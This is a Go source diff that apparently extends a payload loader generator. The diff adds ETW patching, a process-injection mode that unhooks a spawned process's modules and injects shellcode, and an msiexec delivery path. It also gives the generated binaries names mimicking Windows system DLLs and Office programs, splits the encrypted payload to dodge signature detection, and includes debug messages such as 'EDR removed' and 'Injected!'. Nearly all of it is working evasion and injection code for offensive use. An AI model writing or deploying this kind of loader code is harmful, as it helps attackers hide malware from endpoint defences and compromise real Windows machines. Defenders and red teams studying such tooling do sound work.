@@ -11,7 +11,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
-	"strconv"
+	"strings"
 	"text/template"
 )
 
@@ -30,6 +30,11 @@ type JScriptLoader struct {
 type SandboxJScript struct {
 	Variables map[string]string
 }
+
+type ETW struct {
+	Variables map[string]string
+}
+
 type DLL struct {
 	Variables map[string]string
 }
@@ -56,10 +61,11 @@ var (
 func FileName(mode string) (string, string) {
 	var filename string
 	var name string
+	wscript := []string{"APMon", "bisrv", "btpanui", "certcli", "cmdext", "httpapi", "libcrypto", "netlogon", "tcpmon"}
 	dllname := []string{"apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"}
 	cplname := []string{"appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"}
 	officename := []string{"Timesheet", "Reports", "Zoom", "Updates", "Calculator", "Calendar", "Memo", "Desk", "Appwiz"}
-	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive"}
+	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}
 
 	if mode == "excel" {
 		name = officename[Cryptor.GenerateNumer(0, 9)]
@@ -70,23 +76,62 @@ func FileName(mode string) (string, string) {
 		filename = name + ".cpl"
 	}
 	if mode == "wscript" {
-		name = dllname[Cryptor.GenerateNumer(0, 10)]
+		name = wscript[Cryptor.GenerateNumer(0, 10)]
 		filename = name + ".dll"
 	}
 
 	if mode == "dll" {
-		name = dllname[Cryptor.GenerateNumer(0, 10)]
+		name = dllname[Cryptor.GenerateNumer(0, 9)]
 		filename = name + ".dll"
 	}
 
+	if mode == "msiexec" {
+		name = dllname[Cryptor.GenerateNumer(0, 9)]
+		filename = name + ".dll"
+	}
 	if mode == "binary" {
-		name = Binaryname[Cryptor.GenerateNumer(0, 7)]
+		name = Binaryname[Cryptor.GenerateNumer(0, 8)]
 		filename = name + ".exe"
 	}
 	return name, filename
 }
 
-func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool) string {
+func ETW_Buff() (string, string) {
+	var buffer bytes.Buffer
+	ETW := &ETW{}
+	ETW.Variables = make(map[string]string)
+	ETW.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["procEtwNotificationRegister"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["procEtwEventRegister"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["procEtwEventWriteFull"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["hProcess"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["lpBuffer"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["nSize"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["ETW"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["handle"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["dataAddr"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["i"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["data"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["nLength"] = Cryptor.VarNumberLength(4, 9)
+	ETW.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)
+
+	buffer.Reset()
+	ETWTemplate, err := template.New("ETW").Parse(Struct.ETW_Function())
+	if err != nil {
+		log.Fatal(err)
+	}
+	buffer.Reset()
+	if err := ETWTemplate.Execute(&buffer, ETW); err != nil {
+		log.Fatal(err)
+	}
+	return buffer.String(), ETW.Variables["ETW"]
+}
+
+func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, ETW bool, ProcessInjection string) string {
 	var LoaderTemplate, DLLStructTemplate string
 	DLL := &DLL{}
 	DLL.Variables = make(map[string]string)
@@ -185,6 +230,69 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 	DLL.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(4, 12)
 	DLL.Variables["memdata"] = Cryptor.VarNumberLength(4, 12)
 
+	DLL.Variables["CreateProcess"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["GetModuleInformation"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["ReloadRemoteProcess"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["RemoteModuleReloading"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["Target"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["addr"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["buf"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["bytes"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["commandLine"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["data"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["dllBase"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["dllOffset"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["err"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["file"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["funcNtAllocateVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["funcNtCreateThreadEx"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["funcNtProtectVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["funcNtWriteVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["hModule"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["hProcess"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["handleSize"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["hh"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["lpBuffer"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["mi"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["MI"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["mod"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["modules"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["module"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["nLength"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["nSize"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["name"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["needed"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["n"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["offsetaddr"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["oldProtect"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["outString"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["pi"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["procEnumProcessModules"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["EnumProcessModules"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["procGetModuleBaseName"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["GetModuleBaseName"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["procGetModuleInformation"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["process"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["rawbytes"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["raw_bin"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["regionsize"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["s"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["shellcode"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["si"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["size"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["startupInfo"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["x"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["PROCESS_ALL_ACCESS"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["customsyscall"] = Cryptor.VarNumberLength(4, 12)
+
 	if sandbox == true {
 		DLL.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(4, 12)
 		DLL.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
@@ -220,12 +328,26 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 	WindowsVersion.Variables["customsyscallVP"] = DLL.Variables["customsyscallVP"]
 
 	buffer.Reset()
+	if ETW == true {
+		ETW_Function, ETW := ETW_Buff()
+		DLL.Variables["ETW"] = ETW + "()"
+		DLL.Variables["ETW_Function"] = ETW_Function
+	} else {
+		DLL.Variables["ETW"] = ""
+		DLL.Variables["ETW_Function"] = ""
+	}
 	if refresher == false {
 		LoaderTemplate = Struct.WindowsVersion_DLL_Refresher()
 		DLLStructTemplate = Struct.DLL_Refresher()
 	} else {
 		LoaderTemplate = Struct.WindowsVersion_DLL()
 		DLLStructTemplate = Struct.DLL()
+	}
+	if ProcessInjection != "" && refresher == false {
+		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
+		DLL.Variables["processpath"] = ProcessInjection
+		LoaderTemplate = Struct.WindowsVersion_DLL_Refresher()
+		DLLStructTemplate = Struct.Procces_Injection_DLL()
 	}
 
 	WindowsVersionTemplate, err := template.New("WindowsVersion").Parse(LoaderTemplate)
@@ -252,12 +374,15 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 		DLL.Variables["ExportName"] = Struct.WS_JS_Export()
 	}
 
+	if mode == "msiexec" {
+		DLL.Variables["ExportName"] = Struct.WS_JS_Export()
+	}
+
 	buffer.Reset()
 
 	DLLTemplate, err := template.New("DLL").Parse(DLLStructTemplate)
 	if err != nil {
 		log.Fatal(err)
-
 	}
 	buffer.Reset()
 	if err := DLLTemplate.Execute(&buffer, DLL); err != nil {
@@ -267,7 +392,7 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 
 }
 
-func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string) string {
+func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string, ETW bool, ProcessInjection string) string {
 	var Structure string
 	var buffer bytes.Buffer
 	Binary := &Binary{}
@@ -278,8 +403,17 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	Binary.Variables = make(map[string]string)
 	WindowsVersion := &WindowsVersion{}
 	WindowsVersion.Variables = make(map[string]string)
+	splitval := len(b64ciphertext)
+	splitval = splitval - 45
+	encodedfirsthalf := string(b64ciphertext[:splitval])
+	encodedsecondhalf := string(b64ciphertext[splitval:])
 
 	Binary.Variables["ciphertext"] = b64ciphertext
+	Binary.Variables["fullciphertext"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["b64_string1name"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["b64_string2name"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["b64_string1value"] = encodedfirsthalf
+	Binary.Variables["b64_string2value"] = encodedsecondhalf
 	Binary.Variables["key"] = b64key
 	Binary.Variables["iv"] = b64iv
 	Binary.Variables["vkey"] = Cryptor.VarNumberLength(4, 12)
@@ -361,9 +495,67 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	Binary.Variables["oldprotect"] = Cryptor.VarNumberLength(4, 12)
 	Binary.Variables["handlez"] = Cryptor.VarNumberLength(4, 12)
 
+	Binary.Variables["CreateProcess"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["GetModuleInformation"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["ReloadRemoteProcess"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["RemoteModuleReloading"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["Target"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["addr"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["buf"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["bytes"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["commandLine"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["data"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["dllBase"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["dllOffset"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["err"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["file"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["funcNtAllocateVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["funcNtCreateThreadEx"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["funcNtProtectVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["funcNtWriteVirtualMemory"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["hModule"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["hProcess"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["handle"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["handleSize"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["hh"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["lpBuffer"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["mi"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["MI"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["mod"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["modules"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["module"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["nLength"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["nSize"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["name"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["needed"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["n"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["offsetaddr"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["oldProtect"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["outString"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["pi"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["procEnumProcessModules"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["EnumProcessModules"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["procGetModuleBaseName"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["GetModuleBaseName"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["procGetModuleInformation"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["process"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["rawbytes"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["raw_bin"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["regionsize"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["s"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["shellcode"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["si"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["size"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["startupInfo"] = Cryptor.VarNumberLength(4, 12)
+	Binary.Variables["x"] = Cryptor.VarNumberLength(4, 12)
+
 	WindowsVersion.Variables["Version"] = Binary.Variables["Version"]
 	WindowsVersion.Variables["syscall"] = Binary.Variables["syscall"]
-
 	WindowsVersion.Variables["customsyscall"] = Binary.Variables["customsyscall"]
 
 	buffer.Reset()
@@ -379,7 +571,7 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	Binary.Variables["SyscallNumberlist"] = buffer.String()
 	buffer.Reset()
 
-	if strconv.FormatBool(console) == "true" {
+	if console == true && ProcessInjection == "" {
 		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
 		Binary.Variables["DebugImport"] = "\"io\""
 		Binary.Variables["Debug"] = `
@@ -404,6 +596,47 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+name +\" \")"
 		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + WindowsVersion.Variables["Version"] + ")"
 
+	} else if console == true && ProcessInjection != "" {
+		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
+		Binary.Variables["DebugImport"] = `"io"
+		"os"`
+		Binary.Variables["Debug"] = ` 
+		var (
+			debugWriter io.Writer
+		)
+		
+		func printDebug(format string, v ...interface{}) {
+			debugWriter = os.Stdout
+			output := fmt.Sprintf("[DEBUG] ")
+			output += format +"\n"
+			fmt.Fprintf(debugWriter, output, v...)
+		}
+	`
+		Binary.Variables["RefreshPE"] = "printDebug(\"RefreshPE failed:\", err)"
+		Binary.Variables["EDR"] = "printDebug(\"[+] EDR removed\")"
+		Binary.Variables["ShellcodeString"] = "printDebug(\"[*] Loading shellcode into a string\")"
+		Binary.Variables["Pointer"] = "printDebug(\"[*] Create a Pointer on stack\")"
+		Binary.Variables["CopyPointer"] = "printDebug(\"[*] Copy Pointer's attributes\")"
+		Binary.Variables["OverwrittenShellcode"] = "printDebug(\"[*] Overwriten Pointer to point to shellcode String\")"
+		Binary.Variables["OverWrittenPoint"] = "printDebug(\"[*] Overwriting shellcode String with Pointer's attributes\")"
+		Binary.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+name +\" \")"
+		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + WindowsVersion.Variables["Version"] + ")"
+
+		Binary.Variables["PPIDMessage"] =
+			`strpid := fmt.Sprint(` + Binary.Variables["pi"] + `.ProcessId)
+	printDebug("[*] Creating Remote Process: " + strpid)
+	printDebug("[*] Creating Handle to Remote Process")`
+		Binary.Variables["ModuleMessage"] = "printDebug(\"[*] Mapping Modules:\")"
+		Binary.Variables["addr"] = Cryptor.VarNumberLength(4, 12)
+		Binary.Variables["RemoteModuleEnumeration"] =
+			`` + Binary.Variables["addr"] + `:= fmt.Sprintf("%X", ` + Binary.Variables["MI"] + `.LpBaseOfDll)
+			printDebug("[+] " + ` + Binary.Variables["s"] + ` + "'s Base Address: " + ` + Binary.Variables["addr"] + `)
+			printDebug("[*] Reloading " + ` + Binary.Variables["s"] + ` + "'s .Text Field")`
+		Binary.Variables["RemoteModuleMessage"] = "printDebug(\"[+] Reloaded and unhooked EDR\")"
+		Binary.Variables["RemoteReloading"] = "printDebug(\"[+] Interacting with Remote Process\")"
+		Binary.Variables["Injecting"] = "printDebug(\"[+] Injecting Shellcode into Remote Process\")"
+		Binary.Variables["Injected"] = "printDebug(\"[+] Injected!\")"
+
 	} else {
 		Binary.Variables["hide"] = Binary.Variables["Console"] + "(false)"
 		Binary.Variables["DebugImport"] = ""
@@ -417,6 +650,14 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["OverWrittenPoint"] = ""
 		Binary.Variables["ReloadingMessage"] = ""
 		Binary.Variables["VersionMessage"] = ""
+
+		Binary.Variables["RemoteModuleEnumeration"] = ""
+		Binary.Variables["PPIDMessage"] = ""
+		Binary.Variables["ModuleMessage"] = ""
+		Binary.Variables["RemoteModuleMessage"] = ""
+		Binary.Variables["RemoteReloading"] = ""
+		Binary.Variables["Injecting"] = ""
+		Binary.Variables["Injected"] = ""
 	}
 
 	if sandbox == true {
@@ -448,7 +689,23 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["SandboxImport"] = ""
 	}
 
-	Structure = Struct.Binary()
+	if ETW == true {
+		ETW_Function, ETW := ETW_Buff()
+		Binary.Variables["ETW"] = ETW + "()"
+		Binary.Variables["ETW_Function"] = ETW_Function
+	} else {
+		Binary.Variables["ETW"] = ""
+		Binary.Variables["ETW_Function"] = ""
+	}
+
+	if ProcessInjection != "" {
+		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
+		Binary.Variables["processpath"] = ProcessInjection
+
+		Structure = Struct.Procces_Injection()
+	} else {
+		Structure = Struct.Binary()
+	}
 
 	BinaryTemplate, err := template.New("Binary").Parse(Structure)
 	if err != nil {
@@ -487,6 +744,12 @@ func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool)
 		JScriptLoader.Variables["filename"] = filename
 		JScriptLoader.Variables["FileName"] = name
 	}
+	if mode == "msiexec" {
+		LoaderTemplate = Struct.JS_Msiexec_Sub()
+		JScriptLoader.Variables["dllext"] = ".dll"
+		JScriptLoader.Variables["filename"] = filename
+		JScriptLoader.Variables["FileName"] = name
+	}
 	if mode == "wscript" {
 		JScriptLoader.Variables["dllext"] = ".dll"
 		JScriptLoader.Variables["FileName"] = name
@@ -502,7 +765,6 @@ func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool)
 	JSLoaderTemplate, err := template.New("JScriptLoader").Parse(LoaderTemplate)
 	if err != nil {
 		log.Fatal(err)
-
 	}
 	buffer.Reset()
 	if err = JSLoaderTemplate.Execute(&buffer, JScriptLoader); err != nil {
@@ -561,9 +823,11 @@ func JScript_Buff(fso string, dropPath string, encoded string, code string, name
 		JScript.Variables["dllext"] = ".cpl"
 		JScript.Variables["FileName"] = name
 	}
-	if mode == "zip" {
-	}
 	if mode == "wscript" {
+		JScript.Variables["dllext"] = ".dll"
+		JScript.Variables["FileName"] = name
+	}
+	if mode == "msiexec" {
 		JScript.Variables["dllext"] = ".dll"
 		JScript.Variables["FileName"] = name
 	}
@@ -632,7 +896,6 @@ func Macro_Buff(URL string, outFile string) {
 	macroTemplate, err := template.New("macro").Parse(Struct.Macro())
 	if err != nil {
 		log.Fatal(err)
-
 	}
 	buffer.Reset()
 	if err := macroTemplate.Execute(&buffer, macro); err != nil {
@@ -641,13 +904,23 @@ func Macro_Buff(URL string, outFile string) {
 	fmt.Println(buffer.String())
 }
 
-func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool) (string, string) {
+func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, ETW bool, ProcessInjection string) (string, string) {
 	var code string
 	name, filename := FileName(mode)
-	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" {
-		code = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox)
+	if ETW == true {
+		fmt.Println("[+] Patched ETW Enabled")
+	}
+	if ProcessInjection != "" && ETW == true {
+		fmt.Println("[!] Warning ETW Will Only be Patched in the Primarly Process Not the Created One")
+	}
+	if ProcessInjection != "" {
+		fmt.Println("[+] Process Injection Mode Enabled")
+		fmt.Println("[*] Created Process: " + ProcessInjection)
+	}
+	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" || mode == "msiexec" {
+		code = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, ETW, ProcessInjection)
 	} else {
-		code = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name)
+		code = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name, ETW, ProcessInjection)
 	}
 	os.MkdirAll(name, os.ModePerm)
 	Utils.Writefile(name+"/"+name+".go", code)
@@ -674,6 +947,8 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 			return
 		}
 	} else if mode == "wscript" {
+		os.Rename(outFile+".dll", name+".dll")
+	} else if mode == "msiexec" {
 		os.Rename(outFile+".dll", name+".dll")
 	} else if mode == "binary" {
 		os.Chdir("..")
